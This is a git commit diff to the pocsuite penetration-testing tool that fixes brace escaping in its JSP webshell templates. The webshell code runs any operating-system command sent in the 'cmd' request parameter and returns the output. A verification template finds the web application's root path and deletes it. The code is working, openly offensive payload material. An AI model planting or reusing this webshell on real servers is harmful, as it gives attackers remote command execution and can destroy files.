59a4c76ffc03e048f13ff6a3248d7ea9a673d2d9
flsf <jianmaflsf@gmail.com>
2015-12-07 17:15:37 +0800

    Fix jsp webshell bug

--- pocsuite/lib/utils/webshell.py
+++ pocsuite/lib/utils/webshell.py
@@ -96,18 +96,18 @@ class JspShell(Webshell):
                'if (request.getParameter("check") == "1")\n' \
                '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
                'if (request.getParameter("{0}") != null)\n' \
-               '{\n' \
+               '{{\n' \
                '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
                '    OutputStream os = p.getOutputStream();\n' \
                '    InputStream in = p.getInputStream();\n' \
                '    DataInputStream dis = new DataInputStream(in);\n' \
                '    String disr = dis.readLine();\n' \
                '    while ( disr != null)\n' \
-               '    {\n' \
+               '    {{\n' \
                '        out.println(disr);\n' \
                '        disr = dis.readLine();\n' \
-               '    }\n' \
-               '\n}' \
+               '    }}\n' \
+               '\n}}' \
                '%>\n'
     _password = 'cmd'
     _check_data = {'check': '1'}
@@ -122,9 +122,9 @@ class JspVerify(VerifyShell):
                'String path=request.getRealPath("");\n' \
                'out.println(path);\n' \
                'File d=new File(path);\n' \
-               'if(d.exists()){\n' \
+               'if(d.exists()){{\n' \
                '  d.delete();\n' \
-               '  }\n' \
+               '  }}\n' \
                '%>\n' \
                '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
